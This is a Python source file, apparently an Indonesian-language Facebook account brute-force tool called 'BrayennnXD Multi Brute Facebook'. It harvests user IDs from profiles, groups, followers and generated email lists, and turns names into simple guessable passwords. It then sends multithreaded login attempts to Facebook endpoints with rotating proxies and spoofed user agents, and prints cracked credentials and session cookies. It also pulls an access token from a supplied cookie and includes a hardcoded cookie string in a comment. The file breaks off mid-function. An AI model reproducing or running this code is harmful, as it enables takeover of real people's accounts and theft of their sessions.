# install module
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess
try:
	import rich
except ImportError:
	print(' [+] Sedang Menginstall Modul Rich ')
	os.system('pip install rich')
	
try:
	import stdiomask
except ImportError:
	print(' [+] Sedang Menginstall Modul Stdiomask ')
	os.system('pip install stdiomask')
	
try:
	import requests
except ImportError:
	print(' [+] Sedang Menginstall Modul Requests ')
	os.system('pip install requests && pip install mechanize ')


# import module
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from datetime import datetime
from time import sleep, strftime, time
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

# global name
taik1, taik2, lain, ualu, idnya , id, id2, method, ualuh, ualuhh, brayenku, ualuo, pwnya, pwpluss, akun, ok, cp = [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], 0,0
data,data2={},{}
loop=0
ses = requests.Session()
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')

# proxy
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi');exit()
	prox=open('.prox.txt','r').read().splitlines()
	
# user agent methode
for yi in range(10000):
	a='Mozilla/5.0 (Linux; Tizen'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SAMSUNG SM-R835F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	taik1.append(uaku)

for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	taik2.append(brayen1)
	   
# login sc
def logoku():
	cetak(Panel("""    _____         _       _____                 _____             _           _   
   | __  |___ _ _| |_ ___|   __|___ ___ ___ ___|   __|___ ___ ___| |_ ___ ___| |_ 
   | __ -|  _| | |  _| -_|   __| . |  _|  _| -_|   __| .'|  _| -_| . | . | . | '_|
   |_____|_| |___|_| |___|__|  |___|_| |___|___|__|  |__,|___|___|___|___|___|_,_|   """,width=90,style=f"bold white"))

def logindong():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		brayenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+brayenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name'];menu(sy2)
		except KeyError:
			loginesceh()
		except requests.exceptions.ConnectionError:
			print(' [+] Koneksi Internet Anda Tidak Terdeteksi ');exit()
	except IOError:
		loginesceh()
		
def loginesceh():
		try:
			os.system('clear')
			logoku()
			cetak(Panel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
			cok = {'cookie': input(f' [+] Masukan Cokiee : ')}
			link = ses.get('https://www.facebook.com/adsmanager/manage/campaigns' , cookies = cok).text
			gx = re.search("act=(.*?)&nav_source",str(link)).group(1)
			get = ses.get('https://www.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(gx), cookies = cok).text
			tok = re.search('accessToken="(.*?)"',str(get)).group(1)
			tokenw = open(".token.txt", "w").write(tok)
			cokiew = open(".cok.txt", "w").write(cok['cookie'])
			print('\n [+] Token : {}'.format(tok))
			print("\n [+] Login Berhasil | python BrayennnFB-2.3.py")
		except Exception as e:
			print(" [+] Cookies Mokad Kontol")
			os.system('rm -rf .token.txt && rm -rf .cok.txt')
			print(e)
			sleep(3);exit()

# menu scirpt 
def menu(cuka):
	os.system('clear')
	logoku()
	cetak(Panel(f'Halo Selamat Datang [bold green]{cuka}[bold white] User Premium Di Script Brute Force Facebook By BrayennnXD',width=90,padding=(0,1),style=f"bold white"))
	cetak(Panel("""[[bold green]01[bold white]] Crack Publik           [[bold green]05[bold white]] Crack File
[[bold green]02[bold white]] Crack Grup             [[bold green]06[bold white]] Report Bug
[[bold green]03[bold white]] Crack Follower         [[bold green]07[bold white]] Cek Result
[[bold green]04[bold white]] Crack Email            [[bold green]08[bold white]] Hapus Cookie""",width=90,padding=(0,9),style=f"bold white"))
	gwsolo = input(' [+] Pilih : ')
	if gwsolo in ["1","01"]:publik()
	elif gwsolo in ["2","02"]:group()
	elif gwsolo in ["3","03"]:pengikut()
	elif gwsolo in ["4","04"]:email()
	elif gwsolo in ["5","05"]:file()
	elif gwsolo in ["6","06"]:report()
	elif gwsolo in ["7","07"]:()
	elif gwsolo in ["8","08"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt');logindong()
	else:print(' [+] Pilih Yang Bener Asu ');exit()

def report():
	bug = input(f" [+] Silakan Ketik Bugnya : ")
	requests.get(f"")
	print(f" [+] Mengirim Pesan...")
	sleep(3)
	print (f" [+] Terimakasih Atas Masukanya Om:)")
	sleep(3);logindong()
	
# cracker start
def email():
	dpn = ['fadil','ahmad','toni','rendi','kevin','fendi','sandi','bila','ferdi','gery','hafiz','rizal','rian','agus','rehan','levi','fahmi','budi','jaki','juned','fikri','dika','nanang','agus','bode','acill','ilham','eka','toni','toto','bagus','bagas','joko','erik','samsul','udin','ucup','endang','dudung','putra','bondol','cecep','jamal','rifki','cicih','cucu','iis','dahlia','imas','nanda','nazwa','zahra','zahwa','fitri','neni','encin','titin','yoyoh','iin','ineke','andin','tari','ninis','nesya','firda','septi','lasma','mutia','mpit','sifa','siti','syifa','zahra','elin','mela']
	blk = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','maulana','ramdani','ramadan','mulyana','irawan','susanto','saputra','sinaga','mulyono','wibowo','wirawan','hermawan','darmawan','hermanto','sulaeman','kurniawan','setiawan','sukaesih','aprilia','apriliani','rahayu','lestari','safitri','nurhasanah','fatimah','aisyah','nurjanah','khoerunisa','fadilah','ningsih','yuningsih','ningsih','nengsih','suningsih','yulianti','julianti','pertiwi','pratiwi','mulyani','wahyuni','hutagalung','suherni','damayanti','kartika','kartini','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','gaming','gans','nakal','cans']
	nama = input(f" [+] Masukan Nama : ")
	doma = input(f" [+] Masukan Domain : ")
	if not "@" in doma:doma = "@gmail.com"
	else:pass
	for dump in range(random.randint(500,1000)):
		sleep(0.001)
		aa = str(random.randint(1,99))
		bb = str(random.randint(100,99999))
		cc = random.choice(dpn)
		dd = random.choice(blk)
		a_ = f"{nama}{aa}{doma}"
		b_ = f"{nama}{bb}{doma}"
		c_ = f"{cc}{nama}{doma}"
		d_ = f"{nama}{dd}{doma}"
		e_ = f"{nama}{dd}{aa}{doma}"
		f_ = f"{nama}{dd}{bb}{doma}"
		if (a_,b_,c_,d_,e_,f_) in id:pass
		else:
			id.append(f"{a_}|{nama}")
			id.append(f"{b_}|{nama}")
			id.append(f"{c_}|{nama}")
			id.append(f"{d_}|{nama}")
			id.append(f"{e_}|{nama}")
			id.append(f"{f_}|{nama}")
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Id")
		sys.stdout.flush()
	print("\r")
	setting()
	
def file():
	cetak(Panel(f" Masukan Nama File Yang Telah Di Dump Id Contoh : /sdcard/maling.txt",width=90,padding=(0,5),style=f"bold white"))
	files = input(f" [+] Masukan Nama File : ")
	try:
		coli = open(files,"r").read().splitlines()
	except FileNotFoundError:
		print(" [+] File Tidak Tersedia");sleep(2);exit()
	for tukang in coli:
		try:idf,nmf = tukang.split("|")
		except:print(" [+] Pemisah Tidak Didukung");exit()
		id.append(tukang)
		print(f'\r [+] Mengumpulkan Id : {len(id)} ',end='')
		sys.stdout.flush()
		sleep(0.0002)
	print("\r")
	setting()
	
def publik():
	uid = input(' [+] Masukan Id : ').split(',')
	for x in uid:
		brayen(x, '')

def brayen(uidz , after):
    try:
        tok = open('.token.txt','r').read()
        cok = {'cookie':open('.cok.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
            params = {
              'access_token': tok,
              'fields': 'friends'
            }
        else:
            params = {
              'access_token': tok,
              'fields': 'friends.after({})'.format(after)
            }
        po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id')+'|'+x.get('name'))
            print(" [+] Total Id : "+str(len(id)) , end = '\r') 
        afr = po['friends']['paging']['cursors']['after']
        brayen(uidz , afr)
    except(KeyError) as e:
        pass
    print("\r")
    setting()

def group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		sleep(5)
		logindong()
	cetak(Panel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,style=f"bold white"))
	url = input(f' [+] Id Group : ')
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = sop(ses.get(url,cookies={"cokies": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		print('\n [+] Cokies Berada Dalam Mode Free');exit()
	if str(judul) == 'Epsilon':
		print('\n [+] Cokies Tidak Dpt Mengakses Grup');exit()
	if str(judul) == 'Kesalahan':
		print('\n [+] Cokies Yg Anda Masukan Salah');exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		print('\n [+] Cokies Mokad');exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"|"+nama in id:pass
				else:id.append(uid+"|"+nama)
				print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
			
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		sleep(5)
		logindong()
	ses = requests.Session()
	cetak(Panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	user = input(f" [+] Masukan Id : ")
	if user.isdigit():
		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
	else:
		url = (f"https://mbasic.facebook.com/{user}?v=followers")
	try:
		link = ses.get(url, cookies={"cookie": cookie}).text
		if "Halaman Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			sleep(2);exit()
		elif "Anda Diblokir Sementara" in link:
			print("\n [+] Akun Anda Di Batasin Sementara")
			sleep(2);exit()
		elif "Konten Tidak Ditemukan" in link:
			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
			sleep(2);exit()
		else:
			dump_followers(url, cookie)
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
		print(" [+] Tidak Ada Koneksi Internet, Periksa Kembali Koneksi Anda")
		sleep(3);exit()
	print("\r")
	setting()

def dump_followers(link, cookie):
	try:
		url = ses.get(link, cookies={"cookie": cookie}).text
		data = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', str(url))
		for user in data:
			if "profile.php?" in user[0]:
				id.append(re.findall("id=(.*?)&amp;eav", user[0])[0]+'|'+user[1])
			else:
				id.append(re.findall("(.*?)\?eav", user[0])[0]+'|'+user[1])
			print(f" [+] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
			sleep(000000.003)
		if "Lihat Selengkapnya" in url:
			dump_followers("https://mbasic.facebook.com"+sop(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
	except:pass
	
# setting sebelum crack
def setting():
	cetak(Panel('[[bold green]01[bold white]] Crack Dari Urutan Id Tertua\n[[bold green]02[bold white]] Crack Dari Urutan Id Termuda\n[[bold green]03[bold white]] Crack Dari Urutan Id Random',width=90,padding=(0,4),style=f"bold white"))
	hu = input(f' [+] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)

	cetak(Panel("""[[bold green]01[bold white]] Metode Mobile [Work]    [[bold green]04[bold white]] Metode Mobile V2
[[bold green]02[bold white]] Metode Mbasic           [[bold green]05[bold white]] Metode Async
[[bold green]03[bold white]] Metode Messenger        [[bold green]06[bold white]] Metode Reguler""",width=90,padding=(0,4),style=f"bold white"))
	hc = input(f' [+] Pilih Metode : ')
	if hc in ["1","01"]:method.append('mobile')
	elif hc in ["2","02"]:method.append('mbasic')
	elif hc in ["3","03"]:method.append('free')
	elif hc in ["4","04"]:method.append('mobilev2')
	elif hc in ["5","05"]:method.append('async')
	elif hc in ["6","06"]:method.append('reguler')
	else:method.append('mobile')

	cetak(Panel("[[bold green]01[bold white]] Nama+123\n[[bold green]02[bold white]] Nama+123+1234\n[[bold green]03[bold white]] Nama+123+1234+12345\n[[bold green]04[bold white]] Nama+123+1234+12345+Manual",width=90,padding=(0,3),style=f"bold white"))
	pwplus = input(' [+] Pilih :')
	if pwplus in ['04','4']:
		pwpluss.append('ya')
		pwku=input(f' [+] Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	cetak(Panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,style=f"bold white"))
	uatambah = input(f' [+] Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [+] Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()

	cetak(Panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,style=f"bold white"))
	uatambah = input(f' [+] Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [+] Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
	
# mulai crack
def passwrd():
	global prog,des
	yain = []
	cetak(Panel("Jangan Lupa Mode Pesawat Setiap 300 Id Selamat 5 Detik Agar Terhindar Dari Spam Ip Ya",width=90,style=f"bold white"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(mobilev1,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(mbasic,idf,pwv)
				elif 'mobilev2' in method:
					pool.submit(mobilev2,idf,pwv)
				else:
					pool.submit(mobilev2,idf,pwv)
		exit()

def mobilev1(idf,pwv):
	global loop,ok,cp
	ua = random.choice(taik2)
	ua2 = random.choice(taik1)
	ses = requests.Session()
	prog.update(des,description=f"[[bold green]Mobile V1[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			headers = {
				'Host': 'web.facebook.com',
				'content-length': '1792',
				'cache-control': 'max-age=0',
				'sec-ch-ua': "Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132",
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://web.facebook.com',
				'dnt': '1',
				'upgrade-insecure-requests': '1',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'empty',
				'referer': f'https://web.facebook.com/100035960253493/allactivity?category_key=RECOGNIZEDDEVICES&entry_point=ayi_hub',
				'accept-encoding': 'gzip, deflate, br, zstd',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			urls = sop(ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://free.facebook.com/login.php?skip_api_login=1&api_key=521896137868237&kid_directed_site=0&app_id=521896137868237&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D521896137868237%26cbt%3D1696153755085%26e2e%3D%257B%2522init%2522%253A1696153755085%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D4a3e225d-54cb-42ad-9667-322ba42c2af8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252249eba8c0-9bd2-4cde-8149-a93013e204af%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522iapcp8iio9sobdsi2a41%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb521896137868237%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DpRcn5ioiE6Kne0TtIYj5zNCQh8MFSdpDhHDApYm7Hzo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D49eba8c0-9bd2-4cde-8149-a93013e204af%26tp%3Dunspecified&cancel_url=fb521896137868237%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252249eba8c0-9bd2-4cde-8149-a93013e204af%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522iapcp8iio9sobdsi2a41%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, "html.parser")
			form = urls.find('form', {'method':'post'})
			data = {
				'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'uid': idf,
				'next': 'https://free.facebook.com/v16.0/dialog/oauth?cct_prefetching=0&client_id=521896137868237&cbt=1696153755085&e2e=%7B%22init%22%3A1696153755085%7D&ies=1&sdk=android-16.0.0&sso=chrome_custom_tab&nonce=4a3e225d-54cb-42ad-9667-322ba42c2af8&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%2249eba8c0-9bd2-4cde-8149-a93013e204af%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22iapcp8iio9sobdsi2a41%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb521896137868237%3A%2F%2Fauthorize%2F&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=pRcn5ioiE6Kne0TtIYj5zNCQh8MFSdpDhHDApYm7Hzo&ret=login&fbapp_pres=0&logger_id=49eba8c0-9bd2-4cde-8149-a93013e204af&tp=unspecified',
				'flow': 'login_no_pin',
				'pass': pw,
			}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}")
				cetak(tree)
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				cetak(tree) 
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1

def mobilev2(idf,pwv):
	global loop,ok,cp
	ua = random.choice(taik2)
	ua2 = random.choice(taik1)
	ses = requests.Session()
	prog.update(des,description=f"[[bold green]Mobile V2[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			headers = {
    'authority': 'en-gb.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=SAVMZz_TH4HxkO3QcMKAdTXi; datr=KQpMZzU46oSFihw3F7sKhAHL; dpr=1.4956257343292236; ps_l=1; ps_n=1; m_pixel_ratio=1.3603438138961792; wd=1048x2010; checkpoint=%7B%22u%22%3A100005231740539%2C%22t%22%3A1733043108%2C%22step%22%3A0%2C%22n%22%3A%22C084Fh6TsVg%3D%22%2C%22inst%22%3A2689027117948320%2C%22f%22%3A193593390684083%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221733043110.ch.s%3Apw.tDBEAiA-ME1EfNEWTXZpfG1-btQfjiXE0Fl2FDy0LHQ7PZ6_ugIgJhXt0ej0uPVMqhVJGX2gAcIEFoCAswiRu75t3apF9Vg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3Anull%2C%22s%22%3A%22AWWoSzP_zXIn-xFReiU%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D; locale=id_ID; sfiu=AYhYaPV53mQZQ2QzpyiMiXRyoGUrrV4Tgcabs8_rzXt8KYiu1_lhIszZ1Vsvwg0Ew_aop5MaNXY_RNSnq5vS2-H-Wvq5oFnT2fHWBSVYhZEHwC0w8OTnCp5BCmrNfsNsXwlcBjAUN75vnIjlK3LgTSUAmAR90m7aUfzOttqec69JgO9Tr2uyNLt7xQEYZYqDFIf1Z2BpYMZns4dZEVDai82uPOCSo6iZ1Ke84dkFNtFdty8_0vc61pYe2nHiB2ZiGuY; fr=0cJHFH2URwAkVtsCj..BnTAou..AAA.0.0.BnTCO7.AWVdc2Et9GQ',
    'dpr': '1.600000023841858',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			link = ses.get('https://en-gb.facebook.com/', headers=headers).text
			headers = {
    'authority': 'en-gb.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'dpr': '1.600000023841858',
    'origin': 'https://en-gb.facebook.com',
    'referer': 'https://en-gb.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}

			data = {
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
    'email': idf,
    'login_source': 'comet_headerless_login',
    'next': '',
    'pass': pw,
}
			po = ses.post('https://en-gb.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMzMDQzMTM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',headers=headers,data=data)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}")
				cetak(tree)
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				cetak(tree) 
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1
	
def mbasic(idf,pwv):
	global loop,ok,cp
	ua = random.choice(taik2)
	ua2 = random.choice(taik1)
	ses = requests.Session()
	prog.update(des,description=f"[[bold green]Mbasic[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
